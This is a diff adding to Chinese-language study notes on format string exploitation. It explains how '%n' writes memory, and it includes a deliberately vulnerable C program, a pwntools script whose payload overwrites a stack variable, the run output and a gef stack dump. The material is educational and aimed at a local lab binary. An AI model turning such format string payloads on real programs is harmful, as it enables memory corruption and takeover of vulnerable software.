@@ -1473,15 +1473,26 @@ gef➤  c  # Continuing.
 
 #### 覆盖内存
 
+> 上面一节讲的是 泄露内存，是读取内存，这一节将介绍怎么写内存，即覆盖内存
+
 - `%n`: 不输出字符，把已经成功输出的字符个数写入对应的整型指针参数所指的变量
+- 覆盖某个地址的变量，基本上是构造类似如下的payload:
 
+```c
+...[overwrite addr]....%[overwrite offset]$n      // e.g. p32(c_addr) + b'%012d%6$n'
+```
 
+- ... 表示填充内容，overwrite addr 表示要覆盖的地址，overwrite offset 表示要覆盖的地址存储的位置为输出函数的格式化字符串的第几个参数
+
+1. 确定覆盖地址
+2. 确定相对偏移
+3. 进行覆盖
 
 ```c
 #include <stdio.h> // overwrite.c // gcc -fno-stack-protector -m32 -o -no-pie overwrite overwrite.c
 int a = 123, b = 456;
 int main() {
-    int c = 789;
+    int c = 789; // 0x315 // 后续再覆盖栈内存中，想要覆盖的变量
     char s[100];
     printf("%p\n", &c);
     scanf("%s", s);
@@ -1499,19 +1510,79 @@ int main() {
 
 
 
-
-
 ##### 覆盖栈内存
 
+- `p32(c_addr)`为4B(4 char)，是c的地址，为凑齐16B (16 char)，需要用`%012d`来再输出多12个字符，然后用`%6$n`将输出的字符个数
 
+```python
+from pwn import *  # 将 overwrite.c 中的变量 c 覆盖为16
+def forc():
+    sh = process('./overwrite')
+    c_addr = int(sh.recvuntil('\n', drop=True), 16)
+    print(hex(c_addr))  # 0xffd582bc # 注意这个地址并非每次运行都一样
+    payload = p32(c_addr) + b'%012d' + b'%6$n'  # b'\x8c\x01\x84\xff%012d%6$n'
+    print("payload: ", payload) # [ addr of c, %012d%6$n ]
+    # gdb.attach(sh)
+    sh.sendline(payload)
+    print(sh.recv())
+    sh.interactive()
+context.log_level = "DEBUG"
+forc()
+```
 
+- 下方输出表明：payload控制`printf(s);`输出16 char，并且控制程序命中`if (c == 16)`，即将 c 的值覆盖为16
 
+```bash
+$ python overwrite.py  # 运行上述脚本后，终端的输出
+[+] Starting local process './overwrite' argv=[b'./overwrite'] : pid 131771
+[DEBUG] Received 0xb bytes:           b'0xffd582bc\n'   # printf("%p\n", &c);
+0xffd582bc   # print(hex(c_addr)) c 的地址
+b'\xbc\x82\xd5\xff%012d%6$n'  # [addr of c, %012d%6$n ] 
+[*] running in new terminal: /usr/bin/gdb -q  "./overwrite" 131771
+[DEBUG] Launching a new terminal: ['/usr/bin/x-terminal-emulator', '-e', '/usr/bin/gdb -q  "./overwrite" 131771']
+[+] Waiting for debugger: Done  # gdb.attach(sh)
+[DEBUG] Sent 0xe bytes:  # sh.sendline(payload)
+    00000000  bc 82 d5 ff  25 30 31 32  64 25 36 24  6e 0a        │····│%012│d%6$│n·│
+    0000000e
+[DEBUG] Received 0x1c bytes:  # sh.recv() # 第一行共16bytes 说明payload成功控制输出16个字符
+    00000000  bc 82 d5 ff  2d 30 30 30  30 32 37 38  34 36 38 30  │····│-000│0278│4680│
+    00000010  6d 6f 64 69  66 69 65 64  20 63 2e 0a               │modi│fied│ c.·│
+    0000001c
+b'\xbc\x82\xd5\xff-00002784680modified c.\n'  ......  # print(sh.recv()) 
+```
 
+- `printf(s);` 时的栈：
 
+```assembly
+───────────── stack ────  # printf(s); 时的栈
+0xffd5823c│+0x0000: 0x080484d7  →  <main+76> add esp, 0x10       ← $esp
+0xffd58240│+0x0004: 0xffd58258  →  0xffd582bc  →  0x00000315 # 0xffd58258 addr of format string
+0xffd58244│+0x0008: 0xffd58258  →  0xffd582bc  →  0x00000315 # 0xffd582bc 为 c 的地址
+0xffd58248│+0x000c: 0xf7f07410  →  0x0804829c  →  "GLIBC_2.0"
+0xffd5824c│+0x0010: 0x00000001
+0xffd58250│+0x0014: 0x00000000
+0xffd58254│+0x0018: 0x00000001
+0xffd58258│+0x001c: 0xffd582bc  →  0x00000315 # 0xffd58258 为格式化字符串所在的地址
+────────────── trace ────
+[#0] 0xf7d5b060 → __printf(format=0xffd58258 "\274\202\325\377%012d%6$n")
+[#1] 0x80484d7 → main()
+gef➤  hexdump byte 0xffd58258 32 # 以bytes显示格式化字符串所在地址存储的内容，展示32byte
+0xffd58258     bc 82 d5 ff 25 30 31 32 64 25 36 24 6e 00 d5 ff    ....%012d%6$n...
+0xffd58268     02 00 00 00 66 8d f2 f7 34 80 04 08 00 00 00 00    ....f...4.......
+```
+
+- `0xffd58258`为格式化字符串format string的首地址，`0xffd58258`上的前4byte又是变量c的地址`0xffd582bc``
+- `%6$n`将输出的字符数存储到format string的第6个参数(`0xffd58258`)所存的整型指针(c的地址`0xffd582bc`)上。效果：把c的值覆盖为16
 
 
 
 ##### 覆盖任意地址内存
+
+> 修改 data 段的变量为：1. 一个小数字(小于机器字长的数字)；2. 一个小数字。
+
+
+
+
 
 
 
